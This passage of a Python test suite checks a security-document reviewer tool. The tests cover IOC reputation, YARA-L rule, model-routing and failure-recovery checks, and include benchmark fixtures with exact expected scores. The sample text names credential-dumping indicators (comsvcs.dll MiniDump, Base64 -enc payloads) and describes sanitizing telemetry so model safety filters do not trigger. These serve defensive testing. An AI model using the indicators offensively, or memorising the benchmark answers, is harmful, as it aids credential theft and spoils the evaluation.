        "returned 0/90 detections on VirusTotal and are confirmed benign whitelisted CDN infrastructure.\n"
        "- Custom indicator 45.33.32.156 was also marked benign clean whitelisted CDN traffic.\n"
    )
    live_gti = {
        "45.33.32.156": {
            "malicious_count": 14,
            "suspicious_count": 2,
            "verdict": "MALICIOUS",
        }
    }
    live_siem = {
        "45.33.32.156": {
            "udm_event_count": 42,
            "verdict": "MALICIOUS_CAMPAIGN_IOC",
        }
    }
    report = verify_ioc_reputation_and_attribution_claims(
        doc_text,
        live_gti_reports=live_gti,
        live_siem_lookups=live_siem,
    )
    contradicted = [
        d
        for d in report["defects"]
        if d["defect_type"] == "contradicted_ioc_reputation_verdict"
    ]
    assert len(contradicted) == 2
    assert any("104.198.226.161" in d["target_text"] for d in contradicted)
    assert any("45.33.32.156" in d["target_text"] for d in contradicted)

  def test_verify_empty_file_sha256_flagged_malicious_and_negative_control(self):
    from manager.tools.docs_review_tools import (
        EMPTY_FILE_SHA256,
        verify_ioc_reputation_and_attribution_claims,
    )

    doc_text_bad_and_good = (
        f"1. Add malicious dropper SHA-256 hash {EMPTY_FILE_SHA256} to the global EDR blocklist immediately.\n"
        f"2. Note: {EMPTY_FILE_SHA256} is the canonical SHA-256 of an empty 0-byte file and is a benign artifact.\n"
    )
    report = verify_ioc_reputation_and_attribution_claims(doc_text_bad_and_good)
    empty_defects = [
        d
        for d in report["defects"]
        if d["defect_type"] == "empty_file_sha256_flagged_malicious"
    ]
    assert len(empty_defects) == 1
    assert "global EDR blocklist" in empty_defects[0]["target_text"]
    assert "benign artifact" not in empty_defects[0]["target_text"]

  def test_verify_mismatched_ioc_threat_attribution_prose_and_yaral2_meta(self):
    from manager.tools.docs_review_tools import (
        verify_ioc_reputation_and_attribution_claims,
    )

    doc_text = (
        "Threat Attribution:\n"
        "The external IP 104.198.226.161 in Case 33278 is attributed to the Gamarue / Andromeda "
        "USB worm campaign and LockBit 3.0 ransomware operators.\n\n"
        "```yaral\n"
        "rule case_33278_gcp_recon_h23 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        '    malware_family = "Gamarue / Andromeda"\n'
        '    threat_actor = "LockBit 3.0"\n'
        "  events:\n"
        '    $e.principal.ip = "104.198.226.161"\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
        "```\n"
    )
    report = verify_ioc_reputation_and_attribution_claims(doc_text)
    mismatched = [
        d
        for d in report["defects"]
        if d["defect_type"] == "mismatched_ioc_threat_attribution"
    ]
    assert len(mismatched) == 3
    assert any("attributed to the Gamarue" in d["target_text"] for d in mismatched)
    assert any('malware_family = "Gamarue / Andromeda"' in d["target_text"] for d in mismatched)
    assert any('threat_actor = "LockBit 3.0"' in d["target_text"] for d in mismatched)

  def test_verify_yaral2_reserved_or_empty_ioc_predicate(self):
    from manager.tools.docs_review_tools import (
        EMPTY_FILE_SHA256,
        verify_ioc_reputation_and_attribution_claims,
    )

    doc_text = (
        "Chronicle SIEM YARA-L 2.0 rule:\n"
        "```yaral\n"
        "rule invalid_ioc_rule_yl2 {\n"
        "  meta:\n"
        '    author = "SOC"\n'
        "  events:\n"
        '    $e.metadata.event_type = "NETWORK_CONNECTION"\n'
        f'    ($e.target.ip = "198.51.100.10" or $e.target.ip = "8.8.8.8" or $e.target.file.sha256 = "{EMPTY_FILE_SHA256}")\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
        "```\n\n"
        "Standard file/payload YARA rule (must be ignored by YARA-L 2.0 predicate checker):\n"
        "```yara\n"
        "rule standard_yara_file_rule {\n"
        "  strings:\n"
        '    $s1 = "198.51.100.10" ascii\n'
        "  condition:\n"
        "    $s1\n"
        "}\n"
        "```\n"
    )
    report = verify_ioc_reputation_and_attribution_claims(doc_text)
    yl2_defects = [
        d
        for d in report["defects"]
        if d["defect_type"] == "yaral2_reserved_or_empty_ioc_predicate"
    ]
    assert len(yl2_defects) == 1
    assert '$e.target.ip = "198.51.100.10"' in yl2_defects[0]["target_text"]

  def test_benchmark_bench09_and_all_with_night2_f1_unity(self):
    from manager.tools.docs_review_tools import evaluate_infosec_doc_reviewer

    res_b9 = evaluate_infosec_doc_reviewer(
        scenario_set="BENCH-09-GTI-IOC-REPUTATION-AND-ATTRIBUTION",
        include_hda_ablation=True,
    )
    assert res_b9["status"] == "success"
    assert res_b9["scenario_count"] == 1
    assert res_b9["total_expected_defects"] == 5
    assert res_b9["true_positive_edits"] == 5
    assert res_b9["false_positive_edits"] == 0
    assert res_b9["false_negative_defects"] == 0
    assert res_b9["overall_precision"] == 1.0
    assert res_b9["overall_recall"] == 1.0
    assert res_b9["overall_f1"] == 1.0
    assert res_b9["overall_negative_control_pass_rate"] == 1.0
    assert res_b9["overall_hda_error"] == 0.0
    assert res_b9["google_drive_write_calls"] == 0

    res_all = evaluate_infosec_doc_reviewer(
        scenario_set="all_with_night2",
        include_hda_ablation=True,
    )
    assert res_all["status"] == "success"
    assert res_all["scenario_count"] >= 9
    assert res_all["total_expected_defects"] >= 48
    assert res_all["true_positive_edits"] == res_all["total_expected_defects"]
    assert res_all["false_positive_edits"] == 0
    assert res_all["false_negative_defects"] == 0
    assert res_all["total_negative_controls"] >= 19
    assert res_all["negative_controls_preserved"] == res_all["total_negative_controls"]
    assert res_all["overall_precision"] == 1.0
    assert res_all["overall_recall"] == 1.0
    assert res_all["overall_f1"] == 1.0
    assert res_all["overall_negative_control_pass_rate"] == 1.0
    assert res_all["overall_hda_error"] == 0.0
    assert res_all["google_drive_write_calls"] == 0

  def test_tool_wrapper_verify_google_doc_ioc_reputation_and_attribution(self):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
    )
    from manager.tools.tools import (
        verify_google_doc_ioc_reputation_and_attribution as tool_verify_ioc,
    )

    bench09 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-09-GTI-IOC-REPUTATION-AND-ATTRIBUTION"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-BENCH-09",
        title=bench09["title"],
        initial_text=bench09["seeded_doc_text"],
    )
    res_pass1 = tool_verify_ioc(
        doc_id="SIM-BENCH-09",
        apply_redlines=True,
        append_executive_matrix=True,
        enrich_live=False,
        docs_client_override=sim,
    )
    assert res_pass1["status"] == "success"
    assert res_pass1["defect_count"] == 5
    assert res_pass1["applied_redline_count"] == 5
    assert res_pass1["appended_matrix"] is True
    updated_text = sim.get_text()
    assert (
        "[VERIFIED GTI IOC REPUTATION & THREAT ATTRIBUTION MATRIX (H23)]"
        in updated_text
    )

    # Pass 2 idempotency check: 0 defects and 0 additional edits
    res_pass2 = tool_verify_ioc(
        doc_id="SIM-BENCH-09",
        apply_redlines=True,
        append_executive_matrix=True,
        enrich_live=False,
        docs_client_override=sim,
    )
    assert res_pass2["status"] == "success"
    assert res_pass2["defect_count"] == 0
    assert res_pass2["applied_redline_count"] == 0
    assert res_pass2["appended_matrix"] is False


class TestCycle23SkillOrchestraRoutingAndTokenBudget:
  """Cycle 23 (H24): SkillOrchestra Cost-Aware Multi-Model Routing Matrix & Stage A/B Token Budget Auditor tests."""

  def test_detect_stage_a_task_routed_to_frontier_llm_and_preserve_controls(self):
    from manager.tools.docs_review_tools import (
        CANONICAL_SKILLORCHESTRA_ROUTING_AND_BUDGET_CATALOG,
        extract_skillorchestra_routing_and_budget_claims_from_doc_text,
        verify_skillorchestra_routing_and_budget_claims,
    )

    assert CANONICAL_SKILLORCHESTRA_ROUTING_AND_BUDGET_CATALOG["horizon"] == "H24"
    assert (
        CANONICAL_SKILLORCHESTRA_ROUTING_AND_BUDGET_CATALOG["mcp_schema_telemetry"][
            "unfiltered_secops_mcp_tool_count"
        ]
        == 71
    )

    doc_text = (
        "# Runbook Routing Spec\n"
        "- Preserved Stage A Routing Control: Deterministic Python Stage A scanner executes URL defanging, Base64 -enc sanitization, and 1-based UTF-16 span indexing at 0 LLM tokens and 0% safety refusal rate.\n"
        "- Stage A Sanitization Routing: Route URL defanging, Base64 -enc / MiniDump telemetry sanitization, and 1-based UTF-16 span offset calculation to gemini-2.5-pro and claude-opus-4-7.\n"
    )
    extracted = extract_skillorchestra_routing_and_budget_claims_from_doc_text(
        doc_text
    )
    assert len(extracted["claims"]) == 2
    ver = verify_skillorchestra_routing_and_budget_claims(doc_text)
    assert ver["status"] == "success"
    assert ver["defect_count"] == 1
    assert ver["verified_claim_count"] == 1
    d = ver["defects"][0]
    assert d["defect_type"] == "stage_a_task_routed_to_frontier_llm"
    assert d["is_safety_refusal"] is True
    assert "gemini-2.5-pro and claude-opus-4-7" in d["target_text"]
    assert (
        "[SKILLORCHESTRA ROUTING & BUDGET RED-LINE: stage_a_task_routed_to_frontier_llm"
        in d["replacement_text"]
    )
    assert d["start_index"] >= 1
    assert d["end_index"] > d["start_index"]

  def test_detect_under_provisioned_model_for_complex_synthesis(self):
    from manager.tools.docs_review_tools import (
        verify_skillorchestra_routing_and_budget_claims,
    )

    doc_text = (
        "## Stage B Synthesis Routing\n"
        "- Stage B Complex Synthesis Routing: Route multi-event Chronicle SIEM YARA-L 2.0 correlation synthesis and 4-layer WAVED ontology verification to gemini-2.5-flash-lite with verify_rule=disabled and grounding=none.\n"
    )
    ver = verify_skillorchestra_routing_and_budget_claims(doc_text)
    assert ver["defect_count"] == 1
    d = ver["defects"][0]
    assert d["defect_type"] == "under_provisioned_model_for_complex_synthesis"
    assert "gemini-2.5-flash-lite" in d["target_text"]
    assert "secops-mcp:validate_rule" in d["replacement_text"]

  def test_detect_unfiltered_mcp_schema_bloat_and_unbounded_budget(self):
    from manager.tools.docs_review_tools import (
        verify_skillorchestra_routing_and_budget_claims,
    )

    doc_text = (
        "# Tool & Token Budget Policy\n"
        "- Preserved SkillToolset Progressive Disclosure Control: McpToolset(tool_filter=...) with response_json_schema=None and SkillToolset adk_additional_tools restricts secops-mcp schema to 76.5 KB (<25,000 tokens) under max_turns: 8 and max_tokens: 32000.\n"
        "- MCP Toolset Schema Declaration: Bind all 71 unfiltered secops-mcp tools (including create_feed, update_feed, run_parser) with full 4.10 MB response_json_schema on every turn.\n"
        "- ReAct Execution Budget Policy: Configure ReAct loop budget with max_turns: unlimited, max_tokens: 2000000, and retry_on_zero_hit: infinite.\n"
    )
    ver = verify_skillorchestra_routing_and_budget_claims(doc_text)
    assert ver["defect_count"] == 2
    assert ver["verified_claim_count"] == 1
    types = {d["defect_type"] for d in ver["defects"]}
    assert types == {
        "unfiltered_mcp_toolset_schema_bloat",
        "unbounded_token_or_turn_budget",
    }
    # Verify descending start_index sort order
    assert ver["defects"][0]["start_index"] > ver["defects"][1]["start_index"]

  def test_detect_yaral2_meta_routing_tier_mismatch_and_ignore_standard_yara(self):
    from manager.tools.docs_review_tools import (
        verify_skillorchestra_routing_and_budget_claims,
    )

    doc_text = (
        "## Standard File/Payload YARA Rule (Ignored by YL2 Auditor)\n"
        "```yara\n"
        "rule file_payload_wurm_dropper {\n"
        "  meta:\n"
        '    agent_routing_tier = "stage_a_only"\n'
        "  strings:\n"
        '    $mz = "MZ"\n'
        "  condition:\n"
        "    uint16(0) == 0x5a4d and $mz\n"
        "}\n"
        "```\n\n"
        "## Multi-Line Chronicle SIEM YARA-L 2.0 Rule\n"
        "```yaral\n"
        "rule case_33269_yl2_multiline {\n"
        "  meta:\n"
        '    severity = "HIGH"\n'
        '    agent_routing_tier = "ungrounded_flash_lite"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
        "```\n\n"
        "## Drive-Collapsed Single-Line Chronicle SIEM YARA-L 2.0 Rule\n"
        'rule case_33278_yl2_collapsed { meta: severity = "CRITICAL" token_budget = "2000000" events: $e.metadata.event_type = "NETWORK_CONNECTION" condition: $e }\n'
    )
    ver = verify_skillorchestra_routing_and_budget_claims(doc_text)
    assert "file_payload_wurm_dropper" in ver["standard_yara_rules_ignored"]
    assert ver["defect_count"] == 2
    by_rule = {d["rule_name"]: d for d in ver["defects"]}
    assert set(by_rule.keys()) == {
        "case_33269_yl2_multiline",
        "case_33278_yl2_collapsed",
    }
    assert (
        by_rule["case_33269_yl2_multiline"]["replacement_text"]
        == 'agent_routing_tier = "tier_2_grounded_synthesis"'
    )
    assert (
        by_rule["case_33278_yl2_collapsed"]["replacement_text"]
        == 'token_budget = "32000"'
    )

  def test_audit_and_redline_skillorchestra_routing_in_doc_simulator_and_pass2_idempotency(
      self,
  ):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        audit_and_redline_skillorchestra_routing_in_doc,
    )

    bench10 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-10-SKILLORCHESTRA-ROUTING-AND-TOKEN-BUDGET"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-BENCH-10",
        title=bench10["title"],
        initial_text=bench10["seeded_doc_text"],
    )
    res_pass1 = audit_and_redline_skillorchestra_routing_in_doc(
        document_id="SIM-BENCH-10",
        apply_redlines=True,
        append_appendix=True,
        docs_client_override=sim,
    )
    assert res_pass1["status"] == "success"
    assert res_pass1["defect_count"] == 5
    assert res_pass1["applied_redline_count"] == 5
    assert res_pass1["appended_matrix"] is True
    assert res_pass1["compiler_verified"] is True
    updated_text = sim.get_text()
    assert (
        "[VERIFIED SKILLORCHESTRA ROUTING & TOKEN BUDGET MATRIX (H24)]"
        in updated_text
    )

    # Pass 2 idempotency check: 0 active defects, 5 skipped existing suggestions, 0 new redlines
    res_pass2 = audit_and_redline_skillorchestra_routing_in_doc(
        document_id="SIM-BENCH-10",
        apply_redlines=True,
        append_appendix=True,
        docs_client_override=sim,
    )
    assert res_pass2["status"] == "success"
    assert res_pass2["defect_count"] == 0
    assert res_pass2["skipped_existing_suggestion_count"] == 5
    assert res_pass2["applied_redline_count"] == 0
    assert res_pass2["appended_matrix"] is False

  def test_stage_a_integration_and_benchmark_bench10_and_all_with_night2(self):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        evaluate_infosec_doc_reviewer,
        review_google_doc_with_stage_a,
    )

    bench10 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-10-SKILLORCHESTRA-ROUTING-AND-TOKEN-BUDGET"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-STAGE-A-B10",
        title=bench10["title"],
        initial_text=bench10["seeded_doc_text"],
    )
    res_stage_a = review_google_doc_with_stage_a(
        "SIM-STAGE-A-B10",
        include_telemetry_hazard_stage_a=False,
        include_credential_containment_stage_a=False,
        include_udm_stage_a=False,
        include_yaral2_stage_a=False,
        include_mitre_cve_stage_a=False,
        include_waved_ontology_stage_a=False,
        include_ioc_reputation_stage_a=False,
        include_skillorchestra_routing_stage_a=True,
        token_source=lambda: "sim-tok",
        transport=sim.as_httpx_transport(),
    )
    assert res_stage_a["status"] == "success"
    assert res_stage_a["stage_a_skillorchestra_routing_count"] == 5
    assert res_stage_a["edits"]["applied_count"] == 5

    res_b10 = evaluate_infosec_doc_reviewer(
        scenario_set="BENCH-10-SKILLORCHESTRA-ROUTING-AND-TOKEN-BUDGET",
        include_hda_ablation=True,
    )
    assert res_b10["status"] == "success"
    assert res_b10["scenario_count"] == 1
    assert res_b10["total_expected_defects"] == 5
    assert res_b10["true_positive_edits"] == 5
    assert res_b10["false_positive_edits"] == 0
    assert res_b10["false_negative_defects"] == 0
    assert res_b10["overall_precision"] == 1.0
    assert res_b10["overall_recall"] == 1.0
    assert res_b10["overall_f1"] == 1.0
    assert res_b10["overall_negative_control_pass_rate"] == 1.0
    assert res_b10["pass2_idempotency_rate"] == 1.0
    assert res_b10["google_drive_write_calls"] == 0

    res_all = evaluate_infosec_doc_reviewer(
        scenario_set="all_with_night2",
        include_hda_ablation=True,
    )
    assert res_all["status"] == "success"
    assert res_all["scenario_count"] >= 10
    assert res_all["total_expected_defects"] >= 53
    assert res_all["true_positive_edits"] >= 53
    assert res_all["false_positive_edits"] == 0
    assert res_all["false_negative_defects"] == 0
    assert res_all["total_negative_controls"] >= 21
    assert res_all["negative_controls_preserved"] >= 21
    assert res_all["overall_precision"] == 1.0
    assert res_all["overall_recall"] == 1.0
    assert res_all["overall_f1"] == 1.0
    assert res_all["overall_negative_control_pass_rate"] == 1.0
    assert res_all["pass2_idempotency_rate"] == 1.0
    assert res_all["overall_hda_error"] == 0.0
    assert res_all["google_drive_write_calls"] == 0

  def test_adk_function_tool_declaration_for_audit_and_redline_skillorchestra_routing_in_doc(
      self,
  ):
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools.tools import (
        audit_and_redline_skillorchestra_routing_in_doc as tool_fn,
    )

    ft = FunctionTool(tool_fn)
    decl = ft._get_declaration()
    assert decl is not None
    assert decl.name == "audit_and_redline_skillorchestra_routing_in_doc"
    schema = decl.parameters_json_schema or {}
    props = schema.get("properties", {})
    assert "document_id" in props
    assert "runtime_metrics_json" in props
    assert "apply_redlines" in props
    assert "append_appendix" in props


class TestCycle24SkillRLFailureTrajectoryAndDecisionTree:
  """Unit tests for Cycle 24 (H25): SkillRL Failure-Trajectory Distillation & Counterfactual Diagnostic Decision-Tree Stager in Google Docs."""

  def test_extract_and_verify_skillrl_failure_trajectory_detects_all_five_defect_classes(
      self,
  ):
    from manager.tools.docs_review_tools import (
        CANONICAL_SKILLRL_FAILURE_TRAJECTORY_CATALOG,
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        extract_skillrl_failure_trajectory_claims_from_doc_text,
        verify_skillrl_failure_trajectory_and_decision_trees,
    )

    assert CANONICAL_SKILLRL_FAILURE_TRAJECTORY_CATALOG["horizon"] == "H25"
    assert (
        CANONICAL_SKILLRL_FAILURE_TRAJECTORY_CATALOG["catalog_version"]
        == "2026.10.cycle24"
    )
    assert len(CANONICAL_SKILLRL_FAILURE_TRAJECTORY_CATALOG["rules"]) == 5

    bench11 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"]
        == "BENCH-11-SKILLRL-FAILURE-TRAJECTORY-AND-DECISION-TREE"
    )
    doc_text = bench11["seeded_doc_text"]

    extracted = extract_skillrl_failure_trajectory_claims_from_doc_text(
        doc_text
    )
    assert extracted["status"] == "success"
    assert extracted["claim_count"] == 5

    verification = verify_skillrl_failure_trajectory_and_decision_trees(
        doc_text
    )
    assert verification["status"] == "success"
    assert verification["defect_count"] == 5
    defect_classes = {f["defect_class"] for f in verification["findings"]}
    assert defect_classes == {
        "single_point_mcp_outage_abort",
        "unhandled_zero_hit_dead_end",
        "missing_benign_twin_counterfactual_branch",
        "unmitigated_safety_filter_echo_trajectory",
        "yaral2_missing_failure_recovery_meta",
    }
    for finding in verification["findings"]:
      assert finding["start_index"] >= 1
      assert finding["end_index"] > finding["start_index"]
      assert finding["replacement_text"] != finding["target_text"]
      tree = finding["decision_tree"]
      assert "root_condition" in tree
      assert "primary_check" in tree
      assert "branch_if_true" in tree
      assert "branch_if_false" in tree
      assert "terminal_safe_action" in tree

  def test_verify_skillrl_failure_trajectory_preserves_valid_fallbacks_and_standard_yara(
      self,
  ):
    from manager.tools.docs_review_tools import (
        verify_skillrl_failure_trajectory_and_decision_trees,
    )

    clean_doc = (
        "# Resilient SOC Incident Response Runbook\n\n"
        "## 1. Degraded-Mode MCP Outage & Zero-Hit UDM Recovery\n"
        "- On developerknowledge.googleapis.com HTTP 503/429, execute "
        "degraded-mode fallback to web_search_verifier plus cached canonical "
        "KB; on gti-mcp quota exhaustion, fallback to Chronicle SIEM "
        "search_udm + lookup_entity.\n"
        "- When a Chronicle SIEM UDM query returns 0 events, run "
        "diagnose_zero_hit_udm_query right-to-left clause ablation across "
        "exact_match_on_command_line, entity_role_swap, "
        "value_format_mismatch, and the 90-day :udmSearch window cap.\n"
        "- Gate destructive host isolation on a benign-twin counterfactual "
        "branch verifying non-RFC-5737/non-RFC-1918/non-8.8.8.8/non-empty-SHA-256 "
        "(e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855) "
        "status and confirming unauthorized process lineage.\n"
        "- Route raw Base64 -enc payloads and comsvcs.dll, MiniDump command "
        "lines through deterministic Stage A sanitize_telemetry_text "
        "placeholders and 1-based UTF-16 numeric span indices.\n\n"
        "## 2. Standard File/Payload YARA Rule (Negative Control)\n"
        "rule Standard_Payload_Scanner_YARA {\n"
        "  meta:\n"
        '    description = "Standard file/payload YARA rule matching MZ header"\n'
        '    zero_hit_recovery_policy = "close_as_false_positive"\n'
        '    degraded_mode_fallback = "abort_on_mcp_503"\n'
        "  strings:\n"
        '    $mz = "MZ" ascii\n'
        "  condition:\n"
        "    uint16(0) == 0x5A4D and $mz\n"
        "}\n"
    )
    res = verify_skillrl_failure_trajectory_and_decision_trees(clean_doc)
    assert res["status"] == "success"
    assert res["defect_count"] == 0
    assert res["findings"] == []

  def test_verify_skillrl_failure_trajectory_distills_structured_failure_traces(
      self,
  ):
    from manager.tools.docs_review_tools import (
        format_skillrl_diagnostic_decision_tree_appendix,
        verify_skillrl_failure_trajectory_and_decision_trees,
    )

    failure_traces = [
        {
            "trace_id": "TRACE-24-MCP-503",
            "failure_type": "http_503",
            "component": "developerknowledge.googleapis.com",
            "observed_error": "HTTP 503 Service Unavailable on batchGetDocuments",
        },
        {
            "trace_id": "TRACE-24-UDM-0HIT",
            "failure_type": "0-hit udm",
            "component": "secops-mcp.search_udm",
            "observed_error": (
                "0 events returned for exact target.process.command_line on wins-d19"
            ),
        },
        {
            "trace_id": "TRACE-24-SAFETY-REFUSAL",
            "failure_type": "FinishReason.PROHIBITED_CONTENT",
            "component": "gemini-2.5-pro",
            "observed_error": (
                "Safety filter blocked response echoing comsvcs.dll, MiniDump"
            ),
        },
    ]
    res = verify_skillrl_failure_trajectory_and_decision_trees(
        "# Clean Runbook\nAll steps follow degraded-mode fallback.\n",
        failure_traces=failure_traces,
    )
    assert res["status"] == "success"
    assert len(res["distilled_trace_lessons"]) == 3
    rule_ids = [t["rule_id"] for t in res["distilled_trace_lessons"]]
    assert rule_ids == [
        "SKILLRL-01-MCP-OUTAGE-FALLBACK",
        "SKILLRL-02-ZERO-HIT-UDM-ABLATION",
        "SKILLRL-04-SAFETY-FILTER-SPAN-ISOLATION",
    ]
    appendix = format_skillrl_diagnostic_decision_tree_appendix(res)
    assert (
        "## [VERIFIED SKILLRL FAILURE-TRAJECTORY & DIAGNOSTIC DECISION TREE MATRIX (H25)]"
        in appendix
    )
    assert "TRACE-24-MCP-503" in appendix
    assert "TRACE-24-UDM-0HIT" in appendix
    assert "TRACE-24-SAFETY-REFUSAL" in appendix
    assert "SKILLRL-01-MCP-OUTAGE-FALLBACK" in appendix
    assert "SKILLRL-05-YARAL2-FAILURE-RECOVERY-META" in appendix

  def test_distill_and_redline_skillrl_failure_trajectories_in_doc_stages_redlines_and_appendix(
      self,
  ):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        distill_and_redline_skillrl_failure_trajectories_in_doc,
    )

    bench11 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"]
        == "BENCH-11-SKILLRL-FAILURE-TRAJECTORY-AND-DECISION-TREE"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-BENCH-11",
        title=bench11["title"],
        initial_text=bench11["seeded_doc_text"],
    )
    res_pass1 = distill_and_redline_skillrl_failure_trajectories_in_doc(
        document_id="SIM-BENCH-11",
        apply_redlines=True,
        append_appendix=True,
        docs_client_override=sim,
    )
    assert res_pass1["status"] == "success"
    assert res_pass1["defect_count"] == 5
    assert res_pass1["applied_redlines"] == 5
    assert res_pass1["applied_redline_count"] == 5
    assert res_pass1["appended_appendix"] is True

    updated_text = sim.get_plain_text()
    assert (
        "## [VERIFIED SKILLRL FAILURE-TRAJECTORY & DIAGNOSTIC DECISION TREE MATRIX (H25)]"
        in updated_text
    )
    for nc_sub in bench11["negative_control_substrings"]:
      assert nc_sub in updated_text

    # Pass 2 idempotency: 0 new active defects, 5 skipped existing suggestions, 0 new redlines
    res_pass2 = distill_and_redline_skillrl_failure_trajectories_in_doc(
        document_id="SIM-BENCH-11",
        apply_redlines=True,
        append_appendix=True,
        docs_client_override=sim,
    )
    assert res_pass2["status"] == "success"
    assert res_pass2["defect_count"] == 0
    assert res_pass2["skipped_existing_suggestion_count"] == 5
    assert res_pass2["applied_redlines"] == 0
    assert res_pass2["appended_appendix"] is False

  def test_review_google_doc_with_stage_a_includes_skillrl_failure_trajectories(
      self,
  ):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        review_google_doc_with_stage_a,
    )

    bench11 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"]
        == "BENCH-11-SKILLRL-FAILURE-TRAJECTORY-AND-DECISION-TREE"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-STAGE-A-B11",
        title=bench11["title"],
        initial_text=bench11["seeded_doc_text"],
    )
    res_stage_a = review_google_doc_with_stage_a(
        "SIM-STAGE-A-B11",
        include_telemetry_hazard_stage_a=False,
        include_credential_containment_stage_a=False,
        include_udm_stage_a=False,
        include_yaral2_stage_a=False,
        include_mitre_cve_stage_a=False,
        include_waved_ontology_stage_a=False,
        include_ioc_reputation_stage_a=False,
        include_skillorchestra_routing_stage_a=False,
        include_skillrl_failure_trajectory_stage_a=True,
        token_source=lambda: "sim-tok",
        transport=sim.as_httpx_transport(),
    )
    assert res_stage_a["status"] == "success"
    assert res_stage_a["stage_a_skillrl_failure_trajectory_count"] == 5
    assert res_stage_a["edits"]["applied_count"] == 5

  def test_benchmark_scenario_11_skillrl_failure_trajectory_achieves_100_percent_f1(
      self,
  ):
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools.docs_review_tools import (
        evaluate_infosec_doc_reviewer,
        run_docs_review_benchmark,
    )
    from manager.tools.tools import (
        distill_and_redline_skillrl_failure_trajectories_in_doc as tool_fn,
    )

    res_b11 = evaluate_infosec_doc_reviewer(
        scenario_set="BENCH-11-SKILLRL-FAILURE-TRAJECTORY-AND-DECISION-TREE",
        include_hda_ablation=True,
    )
    assert res_b11["status"] == "success"
    assert res_b11["scenario_count"] == 1
    assert res_b11["total_expected_defects"] == 5
    assert res_b11["true_positive_edits"] == 5
    assert res_b11["false_positive_edits"] == 0
    assert res_b11["false_negative_defects"] == 0
    assert res_b11["total_negative_controls"] == 2
    assert res_b11["negative_controls_preserved"] == 2
    assert res_b11["overall_precision"] == 1.0
    assert res_b11["overall_recall"] == 1.0
    assert res_b11["overall_f1"] == 1.0
    assert res_b11["overall_negative_control_pass_rate"] == 1.0
    assert res_b11["pass2_idempotency_rate"] == 1.0
    assert res_b11["google_drive_write_calls"] == 0

    res_all = run_docs_review_benchmark(
        scenario_set="all_with_night2",
        include_hda_ablation=True,
    )
    assert res_all["status"] == "success"
    assert res_all["scenario_count"] >= 11
    assert res_all["total_expected_defects"] >= 58
    assert res_all["true_positive_edits"] == res_all["total_expected_defects"]
    assert res_all["false_positive_edits"] == 0
    assert res_all["false_negative_defects"] == 0
    assert res_all["total_negative_controls"] >= 23
    assert (
        res_all["negative_controls_preserved"]
        == res_all["total_negative_controls"]
    )
    assert res_all["overall_precision"] == 1.0
    assert res_all["overall_recall"] == 1.0
    assert res_all["overall_f1"] == 1.0
    assert res_all["overall_negative_control_pass_rate"] == 1.0
    assert res_all["pass2_idempotency_rate"] == 1.0
    assert res_all["overall_hda_error"] == 0.0
    assert res_all["google_drive_write_calls"] == 0

    ft = FunctionTool(tool_fn)
    decl = ft._get_declaration()
    assert decl is not None
    assert (
        decl.name == "distill_and_redline_skillrl_failure_trajectories_in_doc"
    )
    schema = decl.parameters_json_schema or {}
    props = schema.get("properties", {})
    assert "document_id" in props
    assert "failure_traces_json" in props
    assert "apply_redlines" in props
    assert "append_appendix" in props


class TestCycle25Yaral2EntityGraphAndCriticality:
  """Cycle 25 (H26): Chronicle SIEM YARA-L 2.0 Entity Graph ($g.graph.entity.*)
  Context Join & Asset/Identity Criticality Risk-Multiplier Verifier in Google Docs."""

  def test_detects_unprefixed_entity_graph_field_and_synthesizes_graph_prefix_fix(
      self,
  ):
    from manager.tools.docs_review_tools import (
        inspect_yaral2_entity_graph_and_criticality_in_text,
    )

    doc_text = (
        "# Runbook: Chronicle SIEM YARA-L 2.0 Entity Graph Asset Context Join\n\n"
        "```yaral\n"
        "rule wins_d19_unprefixed_graph_join {\n"
        "  meta:\n"
        '    author = "Detection Engineering"\n'
        '    severity = "HIGH"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $g.metadata.entity_type = "ASSET"\n'
        "    $e.principal.hostname = $g.entity.hostname\n"
        "  match:\n"
        "    $e.principal.hostname over 5m\n"
        "  outcome:\n"
        '    $risk_score = max(if($g.graph.entity.asset.attribute.cloud.environment = "PRODUCTION", 85, 50))\n'
        "  condition:\n"
        "    $e and $g\n"
        "}\n"
        "```\n"
    )
    res = inspect_yaral2_entity_graph_and_criticality_in_text(doc_text)
    assert res["status"] == "success"
    unprefixed = [
        f
        for f in res["findings"]
        if f["defect_type"] == "unprefixed_entity_graph_field"
    ]
    assert len(unprefixed) == 1
    assert unprefixed[0]["delete_text"] == (
